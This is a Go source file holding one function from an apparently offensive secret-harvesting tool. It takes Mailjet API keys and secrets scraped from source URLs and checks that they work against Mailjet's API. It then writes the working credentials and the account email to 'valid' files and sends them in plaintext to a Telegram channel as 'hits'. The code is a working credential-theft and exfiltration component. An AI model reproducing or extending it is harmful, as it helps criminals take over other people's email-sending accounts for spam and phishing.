package main

import (
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"time"
)

func (a *AWSScanner) CheckMailjet(apiKey, secretKey, sourceURL string) bool {
	if !a.Config.APIValidation.Mailjet {
		return false
	}
	combined := apiKey + ":" + secretKey
	if _, loaded := a.KnownKeys.LoadOrStore(combined, true); loaded {
		return false
	}

	globalCounters.mu.Lock()
	globalCounters.APIsFoundTotal++
	globalCounters.mu.Unlock()

	a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, combined), "mailjet_found.txt")

	req, err := http.NewRequest("GET", "https://api.mailjet.com/v3/REST/user", nil)
	if err != nil {
		return false
	}
	req.SetBasicAuth(apiKey, secretKey)
	req.Header.Set("Accept", "application/json")

	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()
	req = req.WithContext(ctx)

	resp, err := do429Retry(client, req, 3)
	if err != nil || resp == nil {
		return false
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return false
	}

	var res struct {
		Data []struct {
			Email string `json:"Email"`
		} `json:"Data"`
	}
	json.NewDecoder(resp.Body).Decode(&res)
	info := ""
	if len(res.Data) > 0 {
		info = res.Data[0].Email
	}

	a.logValid("Mailjet", fmt.Sprintf("APIKey: %s | SecretKey: %s | Email: %s", apiKey, secretKey, info))
	a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, combined), "valid_mailjet.txt")
	a.storeValidKeyLimit("Mailjet", combined, info)

	globalCounters.mu.Lock()
	globalCounters.APIsValidated++
	globalCounters.mu.Unlock()

	msg := a.tgHit("✉️", "MAILJET", sourceURL) + fmt.Sprintf(
		"\n🔑 <b>API Key:</b> <code>%s</code>\n🔐 <b>Secret Key:</b> <code>%s</code>\n📧 <b>Email:</b> %s\n", apiKey, secretKey, info)
	go a.sendTelegram(msg)
	return true
}
